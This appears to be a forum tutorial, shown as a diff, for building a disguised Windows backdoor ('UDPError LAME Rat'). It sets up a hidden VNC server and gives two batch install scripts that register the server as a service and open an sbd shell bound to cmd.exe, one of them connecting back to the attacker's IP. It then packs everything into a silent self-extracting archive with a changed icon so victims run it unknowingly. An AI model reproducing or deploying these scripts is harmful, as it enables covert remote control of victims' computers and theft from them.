@@ -1,0 +1,141 @@
+ TOOLS NEEDED
+
+•1.) a brain
+•2.) code of ethics
+•3.) Windows Machine
+•4.) Archiving application (WinRAR, 7Zip, WinZip)
+•5.) IExpress 2.0
+•6.) UltraVNC or WinVNC (based off the same engine)
+•7.) Netcat (or netcat clone. i'll be using sbd)
+•8.) wget (Windows)
+•9.) wput(Windows)
+•10.) WILL TO READ....
+
+THE SETUP
+
+First you must extract the VNC server to a folder. Something like "n00b"
+All you need there is winvnc.exe and the DLLs everything else can be removed.
+So now you should have winvnc.exe and DLLS. No other folders.
+Create a new folder named "bins" place sbd.exe and sbdbg.exe inside there.
+Now create a folder named "ft" place the wget.exe and wput.exe (and the two dlls that wput need to run).
+
+NOTE: The file structure does NOT have to be like this, however makes things A LOT easier.
+
+SETTING UP THE VNC SERVER
+
+This is pretty much everyone's question. Run winvnc.exe, leave the defaults EXCEPT
+
+•Remove Wallpaper = UNCHECKED
+•Enable Blank Monitor on Viewer Request = UNCHECKED
+•Allow loopback = CHECKED
+•Disable Tray Icon = CHECKED
+•Disable clients options in tray icon menu = CHECKEd
+•Forbid users to close down WinVNC = CHECKED
+
+Then click OK.
+
+Once that's done you have the configuration in the registry. We're going to fetch it.
+Click Start->Run
+and type regedit
+Navigate to "HKLM\Software\ORL" right click it and select "Export". Save it in the folder we made named "noob". Name it something like install1.reg
+Now, navigate to "HKCU\Software\ORL" right click it and select "Export". Save that to the "noob" folder too.
+Name it something like install2.reg
+There you go. VNC is now set up.
+
+STANDARD INSTALLION SCRIPT
+
+I'm not going to explain the following to you.
+So try to learn and read the programmer comments.
+Open up notepad, and paste the following
+
+Code:
+@echo off
+
+REM nice litte banner
+echo **
+echo *  UDPError LAME Rat  *
+echo **
+echo.
+echo Setting up VNC registry entries
+
+REM Add the registry settings
+regedit /S install1.reg
+regedit /S install2.reg
+echo Done.
+Creating system service...
+
+REM Add to system startup.
+winvnc.exe -install
+echo Done.
+echo Creating backdoor
+
+REM This is a STANDARD backdoor, LISTENINg if you want it to "reverse" you need to use the second method
+bin\sbd.exe -D on -k UPD32202 -q -lp 3690 -r 15 -e cmd.exe
+echo Done.
+goto exit
+
+:exit
+exit
+
+Click "File->Save As" make sure you select "All Files" and name it "install.bat"
+
+You would use this method if you know the user is not behind a router or firewall.
+If you don't know what any of the switches on here do then don't use it.
+I'm not going to explain it to you. The last thing we need are skiddies doing this.
+
+COMPLEX INSTALLATION METHOD
+
+Code:
+@echo off
+
+REM nice litte banner
+echo **
+echo *  UDPError LAME Rat  *
+echo **
+echo.
+echo Setting up VNC registry entries
+
+REM Add the registry settings
+regedit /S install1.reg
+regedit /S install2.reg
+echo Done.
+Creating system service...
+
+REM Add to system startup.
+winvnc.exe -install
+winvnc.exe -connect YOU.IP.ADDRESS.HERE::5900
+
+REM Make sure you have your viewer on listening move before you do this.
+echo Done.
+echo Creating backdoor
+
+REM Make sure you open the port on your router.
+bin\sbd.exe -D on -k UPD32202 -qp 3690 YOUR.IP.ADDRESS.HERE -r 15 -e cmd.exe
+echo Done.
+goto exit
+
+:exit
+exit
+
+Save as the above "File->Save As" then "Show All Files" and name it install.bat
+Be sure to open the ports on your router, and make sure you have the vncclient in listening mode,
+as well as the password.
+
+PUTTING IT ALL TOGETHER
+
+Now here's the fun part. Your backdoor is created. You just have to pack it now.
+Why use packers that are already patched? Use WinRAR/WinZip/7Zip! For this purpose
+I'll be using WinRAR (easier).
+
+Right click the folder "noob" select "Add to Archive"
+Select "Create SFX"
+name the file "sweetness.exe"
+then go to "SFX Options"
+Select the path to extract it to,
+Run after "extraction" is the "install.bat"
+so let's say you have the path set to "C:\" you would put "C:\noob\install.bat"
+Then click on modes, and select "Hide All" and "Overwrite all files".
+Then click "OK" click it again.
+Boom! PACKED!
+
+Use a program like ResourceExtractor to change the icon, and you have yourself a backdoor 
